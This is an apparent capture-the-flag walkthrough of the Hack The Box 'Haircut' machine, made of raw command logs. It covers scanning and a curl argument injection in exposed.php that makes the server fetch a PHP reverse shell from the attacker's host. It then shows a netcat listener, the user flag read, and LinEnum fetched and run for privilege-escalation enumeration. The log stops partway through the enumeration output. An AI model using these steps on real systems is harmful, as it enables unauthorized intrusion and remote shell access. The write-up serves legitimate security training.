
RECON
root@kali:~/htb/haircut# nmap -sC -sV -p- -vv -oA full 10.10.10.24
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
|   256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
80/tcp open  http    syn-ack ttl 63 nginx 1.10.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

VULN SCAN
root@kali:~/htb/haircut# nmap -Pn --script vuln 10.10.10.24
Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-11 16:58 EST
Nmap scan report for 10.10.10.24
Host is up (0.024s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /test.html: Test page
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       http://seclists.org/fulldisclosure/2011/Aug/175
|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       http://osvdb.org/74721
|       http://nessus.org/plugins/index.php?view=single&id=55976
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192


ENUM WEB SERVICE
root@kali:~/htb/haircut# whatweb 10.10.10.24
http://10.10.10.24 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.24], Title[HTB Hairdresser], nginx[1.10.0]

root@kali:~/htb/haircut# nikto -h http://10.10.10.24
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.24
+ Target Hostname:    10.10.10.24
+ Target Port:        80
+ Start Time:         2020-11-11 16:32:37 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.10.0 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x59198410 0x90 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3092: /test.html: This might be interesting...
+ 7499 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2020-11-11 16:41:39 (GMT-5) (542 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

root@kali:~/htb/haircut# gobuster -u http://10.10.10.24 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403' -e -fw

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.24/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes : 307,403,200,204,301,302
[+] Expanded     : true
=====================================================
http://10.10.10.24/index.html (Status: 200)
http://10.10.10.24/uploads (Status: 301)
=====================================================

http://10.10.10.24/exposed.php
curl -r http://10.10.14.8/rshell.php

FIND ADDITIONAL DIRECTORIES

root@kali:~/htb/haircut# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e "js,html,txt,php,jpg" -f -t 50 -u http://10.10.10.24

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: js, html, txt, php, jpg | HTTP method: GET | Threads: 50 | Wordlist size: 1543640

Error Log: /root/dirsearch/logs/errors-20-11-11_20-59-34.log

Target: http://10.10.10.24/

Output File: /root/dirsearch/reports/10.10.10.24/_20-11-11_20-59-34.txt

[20:59:34] Starting: 
[20:59:35] 200 -  144B  - //index.html
[20:59:36] 403 -  580B  - //uploads/
[20:59:36] 301 -  194B  - //uploads  ->  http://10.10.10.24/uploads/
[20:59:45] 200 -  223B  - //test.html
[21:00:59] 200 -  132KB - //sea.jpg
[21:02:23] 200 -  141B  - //hair.html
[21:02:54] 200 -  114KB - //bounce.jpg
[21:05:33] 200 -  446B  - //exposed.php
[21:14:36] 200 -  164KB - //carrie.jpg

Task Completed


CREATE TEST PHP FILE
vim test.php
<?php phpinfo(); ?>

TEST FILE UPLOADED
view-source:http://10.10.10.24/exposed.php
<html>
	<head>
		<title>Hairdresser checker</title>
	</head>
	<body>
	<form action='exposed.php' method='POST'>
		<span>
		<p>
		Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
		</p>
		</span>
		<input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
		<input type='submit' name='submit' value='Go' id='submit' />
	</form>
	<span>
		<p>Requesting Site...</p>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100    20  100    20    0     0    469      0 --:--:-- --:--:-- --:--:--   476
<?php phpinfo(); ?>
	</span>
	</body>
</html>

ADD -H PARAMTER TO TEST FILE REQUEST
curl -r http://10.10.14.8/test.php -h
Requesting Site...
Warning: Invalid character is found in given range. A specified range MUST Warning: have only digits in 'start'-'stop'. The server's response to this Warning: request is uncertain. Usage: curl [options...] Options: (H) means HTTP/HTTPS only, 

WRITE A FILE WITH CURL
curl -r http://10.10.14.8/test.php -o test.php
 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0Warning: Failed to create the file test.php: Permission denied 100 20 100 20 0 0 518 0 --:--:-- --:--:-- --:--:-- 526 curl: (23) Failed writing body (0 != 20) 

WRITE TO UPLOAD DIRECTORY
curl -r http://10.10.14.8/test.php -o uploads/test.php
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100    20  100    20    0     0    520      0 --:--:-- --:--:-- --:--:--   526

BROWSE TO UPLOADED TEST.PHP FILE
http://10.10.10.24/uploads/test.php

PHP Version 7.0.15-0ubuntu0.16.04.4
System 	Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 

UPLOAD PHP REVERSE SHELL
http://10.10.14.8/rshell.php -o uploads/rshell.php
% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 5492 100 5492 0 0 131k 0 --:--:-- --:--:-- --:--:-- 134k 

START LISTENER
root@kali:~/htb/haircut# nc -lvp 1234
listening on [any] 1234 ...


TRIGGER REVERSE SHELL
http://10.10.10.24/uploads/rshell.php

GET LOW PRIV REVERSE SHELL
root@kali:~/htb/haircut# nc -lvp 1234
listening on [any] 1234 ...

10.10.10.24: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.24] 52912
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 03:37:42 up  5:11,  0 users,  load average: 0.07, 0.04, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 3: python: not found
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@haircut:/$ 

www-data@haircut:/$ pwd
pwd
/
www-data@haircut:/$ ls -l /home
ls -l /home
total 4
drwxr-xr-x 15 maria maria 4096 May 19  2017 maria
www-data@haircut:/$ ls -l /home/maria
ls -l /home/maria
total 32
drwxr-xr-x 2 maria maria 4096 May 19  2017 Desktop
drwxr-xr-x 2 maria maria 4096 May 16  2017 Documents
drwxr-xr-x 2 maria maria 4096 May 16  2017 Downloads
drwxr-xr-x 2 maria maria 4096 May 16  2017 Music
drwxr-xr-x 2 maria maria 4096 May 16  2017 Pictures
drwxr-xr-x 2 maria maria 4096 May 16  2017 Public
drwxr-xr-x 2 maria maria 4096 May 16  2017 Templates
drwxr-xr-x 2 maria maria 4096 May 16  2017 Videos

GET USER FLAG
www-data@haircut:/$ cat /home/maria/Desktop/user.txt
cat /home/maria/Desktop/user.txt
#######################################

PRIVESC

TRANSFER LINENUM
www-data@haircut:/$ cd /tmp
cd /tmp
www-data@haircut:/tmp$ ls
ls
systemd-private-2f19345395374c15ac5c24239c06cfb9-systemd-timesyncd.service-ENBvR9
vmware-root
www-data@haircut:/tmp$ wget 10.10.14.8/LinEnum.sh
wget 10.10.14.8/LinEnum.sh
--2020-11-12 03:43:19--  http://10.10.14.8/LinEnum.sh
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.1s    

2020-11-12 03:43:19 (455 KB/s) - 'LinEnum.sh' saved [46631/46631]

www-data@haircut:/tmp$ chmod 744 LinEnum.sh
chmod 744 LinEnum.sh
www-data@haircut:/tmp$ ls -l
ls -l
total 56
-rwxr--r-- 1 www-data www-data 46631 Nov 12 03:38 LinEnum.sh
drwx------ 3 root     root      4096 Nov 11 22:26 systemd-private-2f19345395374c15ac5c24239c06cfb9-systemd-timesyncd.service-ENBvR9
drwx------ 2 root     root      4096 Nov 11 22:26 vmware-root

RUN LINENUM
www-data@haircut:/tmp$ ./LinEnum.sh
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Thu Nov 12 03:43:50 CET 2020


### SYSTEM ##############################################
[-] Kernel information:
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-78-generic (buildd@lgw01-11) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
haircut


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
maria            tty1                      Sun Dec 24 17:33:55 +0100 2017


[-] Who else is logged on:
 03:43:50 up  5:17,  0 users,  load average: 0.07, 0.06, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(maria) gid=1000(maria) groups=1000(maria),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
uid=110(mysql) gid=117(mysql) groups=117(mysql)
uid=111(lightdm) gid=118(lightdm) groups=118(lightdm)
uid=112(pulse) gid=121(pulse) groups=121(pulse),29(audio)
uid=113(sshd) gid=65534(nogroup) groups=65534(nogroup)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(maria) gid=1000(maria) groups=1000(maria),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
maria:x:1000:1000:maria,,,:/home/maria:/bin/bash
mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
lightdm:x:111:118:Light Display Manager:/var/lib/lightdm:/bin/false
pulse:x:112:121:PulseAudio daemon,,,:/var/run/pulse:/bin/false
sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin


[-] Super user account(s):
root


[-] Accounts that have recently used sudo:
/home/maria/.sudo_as_admin_successful


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root  root  4.0K May 15  2017 .
drwxr-xr-x 23 root  root  4.0K May 16  2017 ..
drwxr-xr-x 15 maria maria 4.0K May 19  2017 maria


### ENVIRONMENTAL #######################################
[-] Environment information:
USER=www-data
PWD=/tmp
HOME=/var/www
SHLVL=2
_=/usr/bin/env


[-] Path information:
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
drwxrwxrwt 9 root root  4096 Nov 12 03:43 .
drwxr-xr-x 2 root root  4096 May 22  2017 /bin
drwxr-xr-x 2 root root 12288 May 16  2017 /sbin
drwxr-xr-x 2 root root 36864 May 22  2017 /usr/bin
drwxr-xr-x 3 root root  4096 May 19  2017 /usr/local/bin
drwxr-xr-x 2 root root  4096 Feb 15  2017 /usr/local/sbin
drwxr-xr-x 2 root root  4096 May 22  2017 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0000
u=rwx,g=rwx,o=rwx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x   2 root root 4096 May 16  2017 .
drwxr-xr-x 109 root root 4096 May 22  2017 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  244 Dec 29  2014 anacron
-rw-r--r--   1 root root  589 Jul 16  2014 mdadm
-rw-r--r--   1 root root  670 Mar  1  2016 php
-rw-r--r--   1 root root  190 May 15  2017 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x   2 root root 4096 May 16  2017 .
drwxr-xr-x 109 root root 4096 May 22  2017 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  311 Dec 29  2014 0anacron
-rwxr-xr-x   1 root root  376 Mar 31  2016 apport
-rwxr-xr-x   1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x   1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x   1 root root  372 May  6  2015 logrotate
-rwxr-xr-x   1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x   1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x   1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root  214 May 24  2016 update-notifier-common
-rwxr-xr-x   1 root root 1046 May 19  2016 upstart

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 May 15  2017 .
drwxr-xr-x 109 root root 4096 May 22  2017 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x   2 root root 4096 May 16  2017 .
drwxr-xr-x 109 root root 4096 May 22  2017 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  313 Dec 29  2014 0anacron

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root 4096 May 16  2017 .
drwxr-xr-x 109 root root 4096 May 22  2017 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  312 Dec 29  2014 0anacron
-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x   1 root root  211 May 24  2016 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 401 Dec 29  2014 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

# These replace cron's entries
1	5	cron.daily	run-parts --report /etc/cron.daily
7	10	cron.weekly	run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 May 16  2017 .
drwxr-xr-x 5 root root 4096 May 16  2017 ..
-rw------- 1 root root    9 Nov 11 22:31 cron.daily
-rw------- 1 root root    9 Nov 11 22:41 cron.monthly
-rw------- 1 root root    9 Nov 11 22:36 cron.weekly


[-] Systemd timers:
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES
Thu 2020-11-12 13:30:43 CET  9h left     Wed 2020-11-11 22:26:40 CET  5h 17min ago apt-daily.timer              apt-daily.service
Thu 2020-11-12 22:41:40 CET  18h left    Wed 2020-11-11 22:41:39 CET  5h 2min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2020-11-16 03:27:14 CET  3 days left Thu 2020-11-12 02:08:40 CET  1h 35min ago snapd.refresh.timer          snapd.refresh.service

3 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:2b:42  
          inet addr:10.10.10.24  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:2b42/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:2b42/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1944696 errors:0 dropped:58 overruns:0 frame:0
          TX packets:1639743 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:479267239 (479.2 MB)  TX bytes:1000634442 (1.0 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:170 errors:0 dropped:0 overruns:0 frame:0
          TX packets:170 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:13127 (13.1 KB)  TX bytes:13127 (13.1 KB)


[-] ARP history:
? (10.10.10.2) at 00:50:56:b9:1a:f3 [ether] on ens160


[-] Nameserver(s):
nameserver 8.8.8.8


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens160


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1227/nginx: worker 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      1227/nginx: worker 
tcp6       0      0 :::22                   :::*                    LISTEN      -               


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.5  37720  5880 ?        Ss   Nov11   0:03 /sbin/init
root         2  0.0  0.0      0     0 ?        S    Nov11   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Nov11   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    Nov11   0:02 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    Nov11   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    Nov11   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    Nov11   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    Nov11   0:00 [watchdog/1]
root        12  0.0  0.0      0     0 ?        S    Nov11   0:00 [migration/1]
root        13  0.0  0.0      0     0 ?        S    Nov11   0:01 [ksoftirqd/1]
root        14  0.0  0.0      0     0 ?        S    Nov11   0:00 [kworker/1:0]
root        15  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kworker/1:0H]
root        16  0.0  0.0      0     0 ?        S    Nov11   0:00 [kdevtmpfs]
root        17  0.0  0.0      0     0 ?        S<   Nov11   0:00 [netns]
root        18  0.0  0.0      0     0 ?        S<   Nov11   0:00 [perf]
root        19  0.0  0.0      0     0 ?        S    Nov11   0:00 [khungtaskd]
root        20  0.0  0.0      0     0 ?        S<   Nov11   0:00 [writeback]
root        21  0.0  0.0      0     0 ?        SN   Nov11   0:00 [ksmd]
root        22  0.0  0.0      0     0 ?        SN   Nov11   0:00 [khugepaged]
root        23  0.0  0.0      0     0 ?        S<   Nov11   0:00 [crypto]
root        24  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kintegrityd]
root        25  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        26  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kblockd]
root        27  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ata_sff]
root        28  0.0  0.0      0     0 ?        S<   Nov11   0:00 [md]
root        29  0.0  0.0      0     0 ?        S<   Nov11   0:00 [devfreq_wq]
root        34  0.0  0.0      0     0 ?        S    Nov11   0:00 [kswapd0]
root        35  0.0  0.0      0     0 ?        S<   Nov11   0:00 [vmstat]
root        36  0.0  0.0      0     0 ?        S    Nov11   0:00 [fsnotify_mark]
root        37  0.0  0.0      0     0 ?        S    Nov11   0:00 [ecryptfs-kthrea]
root        53  0.0  0.0      0     0 ?        S<   Nov11   0:00 [kthrotld]
root        54  0.0  0.0      0     0 ?        S<   Nov11   0:00 [acpi_thermal_pm]
root        55  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        58  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        59  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        60  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        61  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        62  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root        63  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_0]
root        64  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_0]
root        65  0.0  0.0      0     0 ?        S    Nov11   0:00 [scsi_eh_1]
root        66  0.0  0.0      0     0 ?        S<   Nov11   0:00 [scsi_tmf_1]
root        72  0.0  0.0      0     0 ?        S<   Nov11   0:00 [ipv6_addrconf]
root        85  0.0  0.0      0     0 ?        S<   Nov11   0:00 [deferwq]
root        86  0.0  0.0      0     0 ?        S<   Nov11   0:00 [charger_manager]
root       124  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       125  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       126  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
root       127  0.0  0.0      0     0 ?        S<   Nov11   0:00 [bioset]
